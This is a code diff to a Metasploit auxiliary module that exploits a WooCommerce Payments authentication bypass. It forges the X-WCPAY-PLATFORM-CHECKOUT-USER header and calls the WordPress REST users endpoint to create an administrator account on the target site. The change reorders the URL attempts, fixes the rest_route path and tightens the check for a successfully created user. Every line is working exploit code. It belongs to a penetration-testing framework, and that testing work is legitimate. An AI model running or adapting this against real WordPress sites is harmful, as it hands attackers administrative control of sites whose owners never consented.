@@ -98,14 +98,16 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_status("Attempting to create an administrator user -> #{username}:#{password} (#{email})")
-    ['/', 'index.php', '/rest'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites
+    # Plain permalinks need rest_route. Try it before PATH_INFO, which may
+    # return a successful homepage response instead of dispatching the API.
+    ['/', '/rest', 'index.php'].each do |url_root|
       if url_root == '/rest'
         res = send_request_cgi({
           'uri' => normalize_uri(target_uri.path),
           'headers' => { "X-WCPAY-PLATFORM-CHECKOUT-USER": datastore['ADMINID'] },
           'method' => 'POST',
           'ctype' => 'application/json',
-          'vars_get' => { 'rest_route' => 'wp-json/wp/v2/users' },
+          'vars_get' => { 'rest_route' => '/wp/v2/users' },
           'data' => {
             'username' => username,
             'email' => email,
@@ -115,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
         })
       else
         res = send_request_cgi({
-          'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),
+          'uri' => url_root == '/' ? normalize_uri(wordpress_url_rest_api, 'users') : normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),
           'headers' => { "X-WCPAY-PLATFORM-CHECKOUT-USER": datastore['ADMINID'] },
           'method' => 'POST',
           'ctype' => 'application/json',
@@ -130,7 +132,8 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Connection failed') unless res
       next if res.code == 404
 
-      if res.code == 201 && res.body&.match(/"email":"#{email}"/) && res.body.match(/"username":"#{username}"/)
+      json_body = res.get_json_document if res.code == 201 && res.body
+      if json_body.is_a?(Hash) && json_body['email'] == email && json_body['username'] == username
         print_good('User was created successfully')
         if framework.db.active
           create_credential_and_login({
@@ -152,7 +155,7 @@ class MetasploitModule < Msf::Auxiliary
       else
         print_error("Server response: #{res.body}")
       end
-      break # we didn't get a 404 so we can bail on the 2nd attempt
+      break # Do not repeat a completed creation or a terminal REST error.
     end
   end
 end
